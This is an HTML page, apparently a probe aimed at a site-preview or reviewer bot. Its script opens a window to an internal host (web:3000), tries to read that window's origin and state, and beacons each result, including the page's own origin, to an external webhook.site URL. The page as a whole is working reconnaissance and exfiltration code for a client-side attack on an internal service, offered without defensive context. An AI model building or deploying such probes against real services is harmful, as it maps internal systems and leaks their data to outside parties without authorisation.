<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SitePreview Window Test</title>
</head>
<body>
  <h1>SitePreview Reviewer Window Test</h1>
  <pre id="log"></pre>

  <script>
    const webhook =
      "https://webhook.site/b8808c81-3dc6-4355-b282-f10b6d73f792";

    function report(event, value) {
      document.getElementById("log").textContent +=
        event + ": " + value + "\n";

      const params = new URLSearchParams({
        event,
        value: String(value),
        time: new Date().toISOString()
      });

      fetch(webhook + "?" + params, {
        mode: "no-cors",
        keepalive: true
      }).catch(() => {});
    }

    async function main() {
      report("started", location.origin);

      // Test whether the browser permits a new window.
      const win = window.open(
        "http://web:3000/",
        "sitepreview-test"
      );

      if (!win) {
        report("window-open", "blocked");
        return;
      }

      report("window-open", "created");

      setTimeout(() => {
        try {
          report(
            "window-origin",
            win.location.origin
          );
        } catch (error) {
          report(
            "window-origin",
            "cross-origin-blocked"
          );
        }

        try {
          report(
            "window-closed",
            win.closed
          );
        } catch (error) {
          report(
            "window-closed",
            error.name
          );
        }

        win.close();
        report("test-completed", "yes");
      }, 2000);
    }

    main();
  </script>
</body>
</html>
